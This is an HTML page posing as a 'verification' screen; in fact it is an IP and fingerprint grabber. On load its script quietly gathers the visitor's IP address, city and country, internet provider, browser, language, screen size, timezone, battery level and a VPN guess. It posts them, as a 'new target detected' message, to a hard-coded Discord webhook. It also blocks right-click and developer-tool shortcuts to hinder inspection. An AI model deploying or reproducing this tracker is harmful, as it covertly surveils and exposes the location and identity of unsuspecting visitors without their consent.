<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>V√©rification...</title>
    <script>
        document.addEventListener("contextmenu", e => e.preventDefault());
        document.addEventListener("keydown", e => {
            if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
                e.preventDefault();
            }
        });

        async function getUserInfo() {
            try {
                const ip = await fetch("https://api64.ipify.org?format=json").then(r => r.json()).then(d => d.ip);
                const geo = await fetch(`https://ipapi.co/${ip}/json/`).then(r => r.json());

                const now = new Date().toLocaleString();
                const ua = navigator.userAgent;
                const lang = navigator.language;
                const screenSize = `${screen.width}x${screen.height}`;
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const battery = await (navigator.getBattery?.() || Promise.resolve({ level: 0, charging: false }));
                const batteryStatus = `${(battery.level * 100).toFixed(0)}% - ${battery.charging ? "En charge" : "Sur batterie"}`;
                const vpn = geo.org.includes("VPN") || geo.org.includes("Proxy") ? "üö® VPN / Proxy d√©tect√©" : "‚úÖ Connexion normale";
                const fingerprint = btoa(`${ip}|${ua}|${lang}|${screenSize}`);

                const message = `
**üéØ Nouvelle cible d√©tect√©e**
> üïí Date/Heure : \`${now}\`
> üåç IP : \`${ip}\`
> üß¨ Fingerprint : \`${fingerprint}\`
> üìç Localisation : \`${geo.city}, ${geo.region}, ${geo.country_name}\`
> üß† Fournisseur : \`${geo.org}\`
> üñ•Ô∏è OS/Navigateur : \`${ua}\`
> üó£Ô∏è Langue : \`${lang}\`
> üß≠ Fuseau horaire : \`${timezone}\`
> üì± R√©solution : \`${screenSize}\`
> üîã Batterie : \`${batteryStatus}\`
> üõ°Ô∏è VPN : ${vpn}
                `;

                await sendToDiscord(message);
            } catch (err) {
                console.error("Erreur pendant le tracking :", err);
            }
        }

        async function sendToDiscord(msg) {
            const webhook = "https://discord.com/api/webhooks/1349385558627192843/J9WiGNLlSdX9mAO6GmEXKYDtlN98LxOKaTWf1u3JPsk_IZN_eyEzTnpW-yQ7-qdXqjkV";
            try {
                await fetch(webhook, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: msg })
                });
            } catch (e) {
                console.error("Erreur envoi webhook :", e);
            }
        }

        window.onload = getUserInfo;
    </script>
</head>
<body style="margin:0; background-color:#111;"></body>
</html>
